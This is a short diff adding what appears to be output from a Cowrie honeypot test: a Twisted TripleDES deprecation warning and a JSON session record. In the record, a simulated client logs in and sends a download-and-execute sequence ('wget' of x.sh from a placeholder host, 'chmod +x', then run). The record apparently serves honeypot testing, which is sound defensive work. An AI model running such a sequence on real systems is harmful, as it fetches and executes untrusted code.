@@ -1,0 +1,3 @@
+/cowrie/cowrie-env/lib/python3.13/site-packages/twisted/conch/ssh/transport.py:117: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  b"3des-ctr": (algorithms.TripleDES, 24, modes.CTR),
+{"mode": "shell", "connected": true, "authenticated": true, "lines_sent": ["uname -a", "wget http://files.example/x.sh -O x.sh", "chmod +x x.sh", "./x.sh"], "output_bytes": 838, "error": null, "started_unix": 1794417568.1861703, "client_local": "10.250.25.3:42370", "host_key_fingerprint": "e5:c5:a4:a5:7a:0a:52:b8:99:4e:b0:31:c7:cd:a1:eb", "finished_unix": 1794417577.8294501}
